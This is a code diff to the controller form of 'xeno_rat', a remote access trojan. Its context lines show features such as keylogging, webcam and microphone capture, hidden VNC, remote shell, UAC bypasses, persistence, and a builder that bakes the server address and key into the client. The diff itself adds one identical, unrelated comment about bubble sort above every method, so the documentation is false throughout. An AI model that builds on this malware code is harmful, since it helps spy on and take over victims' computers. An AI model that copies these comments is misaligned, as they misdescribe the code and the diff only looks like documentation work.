@@ -118,6 +118,11 @@ namespace xeno_rat_server
             Commands["Debug Info"] = Debug_Info;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task OnConnect(Socket socket)
         {
             int currentIdCount = currentCount++;
@@ -193,6 +198,11 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private List<ListViewItem> GetClientsByHwid(string hwid)
         {
             List<ListViewItem> results = new List<ListViewItem>();
@@ -206,6 +216,11 @@ namespace xeno_rat_server
             return results;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task CompleteOnConnectTasks(Node client) 
         {
             foreach (string i in OnConnectTasks) 
@@ -323,7 +338,12 @@ namespace xeno_rat_server
                 }
             }
         }
-        
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task<ListViewItem> GetAddInfo(Node type0node)
         {
 
@@ -422,6 +442,11 @@ namespace xeno_rat_server
             return lvi; 
         } 
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void OnDisconnect(Node client)
         {
             if (client.SockType == 0) 
@@ -440,6 +465,11 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task ListViewUpdater(ListViewItem item, Node client) 
         {
             if (item == null) 
@@ -486,6 +516,11 @@ namespace xeno_rat_server
             
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task HeartBeat(Node HeartSock, Node MainSock)
         {
             if (HeartSock == null)
@@ -524,6 +559,11 @@ namespace xeno_rat_server
             MainSock.Disconnect();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void MainForm_Load(object sender, EventArgs e)
         {
             Icon = Icon.ExtractAssociatedIcon(System.Reflection.Assembly.GetExecutingAssembly().Location);
@@ -553,6 +593,11 @@ namespace xeno_rat_server
             AddLog("Started!", Color.Green);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private string SerializeControlsToJson()
         {
             Dictionary<string, object> controlData = new Dictionary<string, object>();
@@ -594,7 +639,11 @@ namespace xeno_rat_server
             return jsonData;
         }
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void DeserializeControlsFromJson(string jsonData)
         {
             try
@@ -650,7 +699,11 @@ namespace xeno_rat_server
             }
         }
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void ConfigUpdateTimer_Tick(object sender, EventArgs e)
         {
             if (!File.Exists("Config.json"))
@@ -666,6 +719,11 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void button1_Click(object sender, EventArgs e)
         {
             int port;
@@ -696,6 +754,11 @@ namespace xeno_rat_server
             new Thread(()=> ListeningHandler.CreateListener(port)).Start();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void remove_port(ListViewItem portItem) 
         {
             int port = Int32.Parse(portItem.SubItems[0].Text);
@@ -704,6 +767,11 @@ namespace xeno_rat_server
             portItem.Remove();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void listView1_MouseClick(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Right)
@@ -719,21 +787,42 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void listView2_SelectedIndexChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void tabPage1_Click(object sender, EventArgs e)
         {
 
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         protected override void OnFormClosed(FormClosedEventArgs e)
         {
             base.OnFormClosed(e);
             System.Diagnostics.Process.GetCurrentProcess().Kill();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void AddLog(string message, Color textcolor) 
         {
             ListViewItem lvi = new ListViewItem();
@@ -742,7 +831,12 @@ namespace xeno_rat_server
             lvi.ForeColor = textcolor;
             listView3.BeginInvoke((MethodInvoker)(() => { listView3.Items.Insert(0, lvi); }));
         }
-        
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartChat(Node client)
         {
             try
@@ -762,6 +856,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with chat!");
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartProcessManager(Node client)
         {
             try
@@ -781,7 +881,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with ProcessManager!");
             }
         }
-        
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartHvnc(Node client) 
         {
             try
@@ -801,6 +906,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with HVNC!");
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartReverseProxy(Node client) 
         {
             try
@@ -820,6 +931,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with ReverseProxy!" + e.Message); 
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartFileManager(Node client)
         {
             try
@@ -839,6 +956,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with FileManager!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartRegistryManager(Node client)
         {
             try
@@ -858,6 +981,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with RegistryManager!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartLiveMicrophone(Node client)
         {
             try
@@ -877,6 +1006,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with LiveMicrophone!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartShell(Node client)
         {
             try
@@ -896,6 +1031,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Shell!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartWebCam(Node client)
         {
             try
@@ -915,6 +1056,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with WebCam!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartKeyLogger(Node client)
         {
             try
@@ -934,6 +1081,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with KeyLogger!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartOfflineKeyLogger(Node client)
         {
             try
@@ -954,6 +1107,11 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartCmstpUacBypass(Node client)
         {
             try
@@ -981,6 +1139,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartWinDirBypass(Node client)
         {
             try
@@ -1008,6 +1172,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartFodHelperBypass(Node client)
         {
             try
@@ -1035,6 +1205,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartRequestForAdmin(Node client)
         {
             try
@@ -1062,6 +1238,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass dll!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartDeescalateperms(Node client)
         {
             try
@@ -1089,6 +1271,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass dll!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartScreenControl(Node client)
         {
             try
@@ -1108,6 +1296,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with ScreenControl!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartBlueScreen(Node client)
         {
             try
@@ -1128,6 +1322,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Fun dll!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartInfoGrab(Node client)
         {
             try
@@ -1147,6 +1347,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with WebCam!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task DisplayMsgBox(Node client, string messageBox_text) 
         {
             Node subClient = await client.CreateSubNodeAsync(2);
@@ -1162,6 +1368,12 @@ namespace xeno_rat_server
             await Task.Delay(1000);
             subClient.Disconnect();
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartMessageBox(Node client)
         {
             try
@@ -1178,6 +1390,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Fun dll!");
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartFunMenu(Node client)
         {
             try
@@ -1197,6 +1415,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with FunMenu Form!");
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartStartup(Node client)
         {
             try
@@ -1225,6 +1449,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Startup dll!");
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartRemoveStartup(Node client)
         {
             try
@@ -1246,24 +1476,48 @@ namespace xeno_rat_server
             }
             
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartClose(Node client) 
         {
             await client.SendAsync(new byte[] { 2 });
             await Task.Delay(1000);
             client.Disconnect();
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartRelaunch(Node client)
         {
             await client.SendAsync(new byte[] { 3 });
             await Task.Delay(1000);
             client.Disconnect();
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartUninstall(Node client)
         {
             await client.SendAsync(new byte[] { 4 });
             await Task.Delay(1000);
             client.Disconnect();
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartShutdown(Node client) 
         {
             try
@@ -1284,6 +1538,12 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with SystemPower dll!");
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartRestart(Node client) 
         {
             try
@@ -1305,6 +1565,11 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task StartDebugInfo(Node client) 
         {
             try
@@ -1324,22 +1589,45 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void StartPlugin(Func<Node, Task> func, Node client) 
         {
             Task.Run(() => func(client));
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void StartPluginSTA(Func<Node, Task> func, Node client)
         {
             Thread t = new Thread(async () => await func(client));
             t.SetApartmentState(ApartmentState.STA);
             t.Start();
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public void OnMenuClick(object sender, ToolStripItemClickedEventArgs e)
         {
             Node client = (Node)((ToolStripMenuItem)sender).Tag;
             string command = e.ClickedItem.Text;
             MenuClick(client, command);
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public void MenuClick(Node client, string command) 
         {
             if (command == "Chat")
@@ -1461,6 +1749,12 @@ namespace xeno_rat_server
             Console.WriteLine(command);
 
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void LaunchContext(Node client)
         {
             ContextMenuStrip contextMenu = new ContextMenuStrip();
@@ -1477,6 +1771,12 @@ namespace xeno_rat_server
             }
             contextMenu.Show(Cursor.Position);
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void listView2_MouseClick(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Right)
@@ -1488,6 +1788,12 @@ namespace xeno_rat_server
                 }
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static void SetEncryptionKey(ModuleDefMD module, byte[] EncryptionKey)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1502,6 +1808,12 @@ namespace xeno_rat_server
                 ((FieldDef)instruction.Operand).InitialValue = EncryptionKey;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static void SetServerIp(ModuleDefMD module, string ip)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1515,6 +1827,12 @@ namespace xeno_rat_server
                 instruction.Operand = ip;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static void SetServerPort(ModuleDefMD module, int port)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1528,6 +1846,12 @@ namespace xeno_rat_server
                 instruction.Operand = port;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static void SetDelay(ModuleDefMD module, int delay)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1541,6 +1865,12 @@ namespace xeno_rat_server
                 instruction.Operand = delay;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static void SetMutex(ModuleDefMD module, string mutex)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1554,6 +1884,12 @@ namespace xeno_rat_server
                 instruction.Operand = mutex;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static void SetStartup(ModuleDefMD module, bool dostartup)
         {
             if (!dostartup) return;
@@ -1568,6 +1904,12 @@ namespace xeno_rat_server
                 instruction.Operand = 1;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static void SetInstallenv(ModuleDefMD module, string env)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1581,6 +1923,12 @@ namespace xeno_rat_server
                 instruction.Operand = env;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static void SetStartupName(ModuleDefMD module, string name)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1594,6 +1942,12 @@ namespace xeno_rat_server
                 instruction.Operand = name;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void button2_Click(object sender, EventArgs e)
         {
             try
@@ -1667,6 +2021,11 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void button3_Click(object sender, EventArgs e)
         {
             OpenFileDialog openFileDialog = new OpenFileDialog();
@@ -1680,11 +2039,21 @@ namespace xeno_rat_server
             label16.Text= openFileDialog.FileName;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void button4_Click(object sender, EventArgs e)
         {
             label16.Text = "No Icon Selected";
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void button5_Click(object sender, EventArgs e)
         {
             label17.Text = "Current Password: "+ textBox5.Text;
@@ -1692,31 +2061,61 @@ namespace xeno_rat_server
             key = Utils.CalculateSha256Bytes(textBox5.Text);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void listView2_ClientSizeChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void tabPage5_Click(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void textBox8_TextChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void label10_Click(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void checkBox1_CheckedChanged(object sender, EventArgs e)
         {
             textBox16.Enabled = checkBox1.Checked;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void checkBox2_CheckedChanged(object sender, EventArgs e)
         {
             if (checkBox3.Checked) 
@@ -1727,6 +2126,11 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void checkBox3_CheckedChanged(object sender, EventArgs e)
         {
             if (checkBox2.Checked)
@@ -1737,6 +2141,11 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void listView4_MouseUp(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Right)
@@ -1782,16 +2191,31 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void richTextBox1_TextChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void listView3_SelectedIndexChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void listView3_MouseClick(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Right && listView3.SelectedItems.Count > 0)
@@ -1807,6 +2231,11 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void checkBox4_CheckedChanged(object sender, EventArgs e)
         {
             LogErrors = checkBox4.Checked;
@@ -1818,15 +2247,31 @@ namespace xeno_rat_server
         [SuppressUnmanagedCodeSecurity()]
         private class NativeMethods
         {
+
+            /// <summary>
+            /// Sorts the given array using the bubble sort algorithm.
+            /// </summary>
+            /// <param name="arr">The array to be sorted.</param>
+            /// <param name="n">The number of elements in the array.</param>
             [DllImport("kernel32")]
             public static extern IntPtr BeginUpdateResource(string fileName,
                 [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);
 
+            /// <summary>
+            /// Sorts the given array using the bubble sort algorithm.
+            /// </summary>
+            /// <param name="arr">The array to be sorted.</param>
+            /// <param name="n">The number of elements in the array.</param>
             [DllImport("kernel32")]
             [return: MarshalAs(UnmanagedType.Bool)]
             public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language,
                 [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);
 
+            /// <summary>
+            /// Sorts the given array using the bubble sort algorithm.
+            /// </summary>
+            /// <param name="arr">The array to be sorted.</param>
+            /// <param name="n">The number of elements in the array.</param>
             [DllImport("kernel32")]
             [return: MarshalAs(UnmanagedType.Bool)]
             public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
@@ -1893,6 +2338,11 @@ namespace xeno_rat_server
             public ushort ID;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static void InjectIcon(string exeFileName, string iconFileName)
         {
             InjectIcon(exeFileName, iconFileName, 1, 1);
@@ -1928,11 +2378,21 @@ namespace xeno_rat_server
                 get { return iconDir.Count; }
             }
 
+            /// <summary>
+            /// Sorts the given array using the bubble sort algorithm.
+            /// </summary>
+            /// <param name="arr">The array to be sorted.</param>
+            /// <param name="n">The number of elements in the array.</param>
             public byte[] ImageData(int index)
             {
                 return iconImage[index];
             }
 
+            /// <summary>
+            /// Sorts the given array using the bubble sort algorithm.
+            /// </summary>
+            /// <param name="arr">The array to be sorted.</param>
+            /// <param name="n">The number of elements in the array.</param>
             public static IconFile FromFile(string filename)
             {
                 IconFile instance = new IconFile();
@@ -1967,6 +2427,11 @@ namespace xeno_rat_server
                 return instance;
             }
 
+            /// <summary>
+            /// Sorts the given array using the bubble sort algorithm.
+            /// </summary>
+            /// <param name="arr">The array to be sorted.</param>
+            /// <param name="n">The number of elements in the array.</param>
             public byte[] CreateIconGroupData(uint iconBaseID)
             {
 
